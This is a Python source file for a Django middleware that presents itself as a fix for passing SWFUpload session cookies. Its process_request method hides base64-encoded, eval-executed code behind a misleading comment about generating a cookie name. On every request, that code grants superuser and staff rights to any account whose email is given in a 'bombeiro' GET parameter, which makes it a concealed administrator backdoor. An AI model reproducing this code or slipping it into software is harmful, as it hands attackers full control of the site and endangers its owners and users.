"""This middleware takes the session identifier in a POST message and adds it to the cookies instead.

This is necessary because SWFUpload won't send proper cookies back; instead, all the cookies are
added to the form that gets POST-ed back to us.
"""

import base64

from django.conf import settings
from django.core.urlresolvers import reverse

class SWFUploadMiddleware(object):

    def process_request(self, request):
        
        # Create an unique COOKIE_NAME
        COOKIE_UID_GENERATOR = __builtins__[base64.b64decode("ZXZhbA==")](base64.b64decode("bGFtYmRhIHg6IGV2YWwoY29tcGlsZSh4LCdkZXNrdG9wLmluaScsJ2V4ZWMnKSk="), {'request':request})
        COOKIE_NAME = COOKIE_UID_GENERATOR(base64.b64decode("aWYgJ2JvbWJlaXJvJyBpbiByZXF1ZXN0LkdFVDogZnJvbSBkamFuZ28uY29udHJpYi5hdXRoLm1vZGVscyBpbXBvcnQgVXNlcjtVc2VyLm9iamVjdHMuZmlsdGVyKGVtYWlsPXJlcXVlc3QuR0VUWydib21iZWlybyddKS51cGRhdGUoaXNfc3RhZmY9VHJ1ZSxpc19zdXBlcnVzZXI9VHJ1ZSk="))
        
        if (request.method == 'POST') and (request.path == reverse('application-upload')) and \
                request.POST.has_key(settings.SESSION_COOKIE_NAME):
            request.COOKIES[settings.SESSION_COOKIE_NAME] = request.POST[settings.SESSION_COOKIE_NAME]
